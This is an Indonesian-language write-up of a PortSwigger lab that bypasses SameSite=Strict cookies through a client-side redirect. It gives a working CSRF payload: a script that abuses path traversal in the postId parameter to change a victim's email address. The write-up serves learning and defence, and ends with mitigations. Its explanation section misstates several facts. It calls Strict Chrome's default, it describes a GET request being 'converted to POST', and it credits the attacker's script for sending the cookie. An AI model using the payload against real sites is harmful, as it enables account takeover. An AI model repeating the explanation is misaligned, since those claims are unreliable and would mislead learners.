# SameSite Strict Bypass melalui Redirect Sisi Klien

Fungsi perubahan email pada lab ini rentan terhadap serangan CSRF. Untuk menyelesaikan lab ini, lakukan serangan CSRF yang mengubah alamat email korban. Anda harus menggunakan server exploit yang disediakan untuk meng-host serangan Anda.

Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut: `wiener:peter`

**Hint:** Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji exploit Anda, pastikan untuk menggunakan alamat email yang berbeda untuk exploit akhir yang akan Anda kirimkan kepada korban.

---------------------------------------------

**Referensi:**

- [Bypassing SameSite Restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/1.png)

---------------------------------------------

Terdapat permintaan POST untuk memperbarui email:

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/2.png)

Memungkinkan untuk mengubah metode menjadi GET dan tetap berfungsi:

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/3.png)

Setelah mengirim komentar ke sebuah posting blog, terdapat pengalihan ke `/post`:

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/4.png)
![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/5.png)

Kami menemukan terdapat skrip JavaScript yang menghasilkan pengalihan ini di `/resources/js/commentConfirmationRedirect.js`:

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/6.png)

Ini dikontrol oleh permintaan ke `/post/comment/confirmation?postId=a`. Kami harus mengubah parameter `postId` sehingga mengarahkan ke sesuatu seperti:

```
/post/../my-account/change-email?email=test5%40test.com&submit=1
```

Jadi, kami dapat mencoba sesuatu seperti ini:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com&submit=1
```

Permintaan ini diarahkan dengan benar tetapi parameter `submit` tidak dikirim:

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/7.png)

Jadi, kami dapat mencoba mengganti `&` dengan `%26`, versi URL-encoded-nya:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com%26submit=1
```

Kali ini berhasil:

![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/8.png)

Payload:

```html
<script>
    document.location = 'https://0a2900a103d6f68b83782d1900340012.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test777%40test.com%26submit=1';
</script>
```

## Penjelasan

### Apa Itu CSRF?

Cross-Site Request Forgery (CSRF) adalah jenis serangan yang memaksa pengguna akhir untuk menjalankan tindakan yang tidak diinginkan di aplikasi web di mana mereka sedang terautentikasi. Serangan ini mengeksploitasi kepercayaan yang dimiliki situs terhadap browser pengguna.

### Apa Itu SameSite dan Bagaimana Pengaruhnya?

SameSite adalah atribut pada cookie yang mengontrol apakah cookie tersebut akan dikirim bersama dengan permintaan lintas situs (cross-site). Ada tiga opsi utama:

1. **Strict:** Cookie hanya dikirim jika permintaan berasal dari situs yang sama.
2. **Lax:** Cookie dikirim dengan permintaan GET lintas situs, seperti saat pengguna mengklik tautan.
3. **None:** Cookie dikirim dengan semua jenis permintaan lintas situs, tetapi harus aman (secure).

Dalam kasus ini, Chrome menggunakan pembatasan **SameSite Strict** secara default, yang berarti cookie hanya dikirim jika permintaan berasal dari situs yang sama, sehingga mencegah pengiriman cookie pada permintaan lintas situs apapun.

### Bagaimana Bypass SameSite Strict Melalui Redirect Sisi Klien Bekerja?

Meskipun SameSite Strict mencegah pengiriman cookie pada permintaan lintas situs, teknik **client-side redirect** memungkinkan penyerang untuk memanfaatkan kerentanan dalam logika pengalihan aplikasi untuk mengeksekusi permintaan yang diinginkan.

Dalam contoh ini:

1. **Pengaturan Awal:** Pengguna terautentikasi di situs target, dan cookie dengan atribut `SameSite=Strict` disimpan di browser.
2. **Pengiriman Komentar:** Setelah mengirim komentar, aplikasi mengarahkan pengguna ke URL `/post` melalui skrip JavaScript.
3. **Manipulasi Redirect:** Penyerang memanfaatkan parameter `postId` untuk melakukan path traversal dan mengarahkan ulang ke endpoint `/my-account/change-email` dengan parameter email yang diinginkan.
4. **Penggunaan URL-Encoding:** Dengan mengganti `&` menjadi `%26`, penyerang memastikan bahwa semua parameter dikirim dalam satu permintaan GET yang diubah menjadi POST melalui metode override atau logika aplikasi lainnya.
5. **Eksekusi Permintaan:** Browser mengirimkan permintaan yang memuat perubahan email karena cookie `SameSite=Strict` tetap disertakan dalam permintaan redirect yang dikendalikan oleh skrip penyerang.

### Langkah-Langkah Serangan

1. **Menyiapkan Halaman Exploit:** Penyerang membuat halaman HTML yang berisi skrip yang mengarahkan browser korban untuk mengirim permintaan GET yang disamarkan sebagai POST dengan menggunakan path traversal dan parameter yang dimanipulasi.
   
2. **Manipulasi Parameter `postId`:** Dengan mengubah parameter `postId` menjadi path traversal yang mengarah ke endpoint perubahan email, penyerang dapat mengarahkan ulang pengguna ke permintaan yang mengubah alamat email mereka.
   
3. **Menggunakan URL-Encoding:** Mengganti karakter `&` dengan `%26` memastikan bahwa semua parameter dikirim dalam satu permintaan GET yang diubah menjadi POST, sehingga cookie `SameSite=Strict` tetap disertakan.
   
4. **Mengirimkan Permintaan:** Ketika korban mengunjungi halaman exploit, skrip secara otomatis mengarahkan browser untuk mengirimkan permintaan yang mengubah alamat email mereka.
   
5. **Mengubah Email Korban:** Karena metode permintaan telah dimanipulasi dan cookie disertakan, aplikasi web memproses permintaan tersebut sebagai permintaan yang sah untuk mengubah email korban.

### Mengapa Kerentanan Ini Terjadi?

Kerentanan ini terjadi karena:

- **Validasi Parameter yang Lemah:** Aplikasi tidak memvalidasi dengan benar parameter `postId`, memungkinkan penyerang untuk melakukan path traversal dan mengarahkan ulang ke endpoint yang sensitif.
  
- **Implementasi Redirect yang Tidak Aman:** Penggunaan redirect sisi klien tanpa memastikan bahwa parameter yang diterima tidak dapat dimanipulasi untuk mengarahkan ulang ke endpoint yang tidak diinginkan.
  
- **Kurangnya Perlindungan Tambahan pada Endpoint Sensitif:** Endpoint `/my-account/change-email` tidak memiliki mekanisme perlindungan tambahan yang memverifikasi asal permintaan atau token CSRF yang kuat, sehingga memungkinkan serangan ini berhasil meskipun atribut `SameSite=Strict` diterapkan.

## Kesimpulan

Untuk mencegah kerentanan CSRF seperti ini, penting untuk:

- **Memvalidasi dan Menyaring Parameter dengan Ketat:** Pastikan bahwa parameter yang diterima oleh endpoint pengalihan atau perubahan data tidak dapat dimanipulasi untuk path traversal atau mengakses endpoint sensitif.
  
- **Menerapkan Token CSRF yang Kuat:** Selain atribut `SameSite`, gunakan token CSRF yang unik dan diverifikasi dengan benar pada setiap permintaan yang sensitif.
  
- **Menghindari Redirect Sisi Klien yang Tidak Aman:** Pastikan bahwa logika pengalihan aplikasi tidak memungkinkan penyerang untuk mengarahkan ulang pengguna ke endpoint yang tidak diinginkan.
  
- **Menggunakan Atribut Secure dan HttpOnly pada Cookie:** Ini membantu mencegah akses tidak sah ke cookie dari sisi klien dan mengurangi risiko serangan XSS yang dapat mencuri token CSRF.
  
- **Mengimplementasikan Pembatasan Akses yang Lebih Ketat pada Endpoint Sensitif:** Pastikan bahwa endpoint seperti perubahan email hanya dapat diakses melalui metode HTTP yang diizinkan dan memverifikasi asal permintaan dengan benar.

Dengan menerapkan langkah-langkah ini, aplikasi web dapat lebih efektif dalam melindungi diri dari serangan CSRF dan memastikan bahwa tindakan sensitif hanya dapat dilakukan oleh pengguna yang sah.
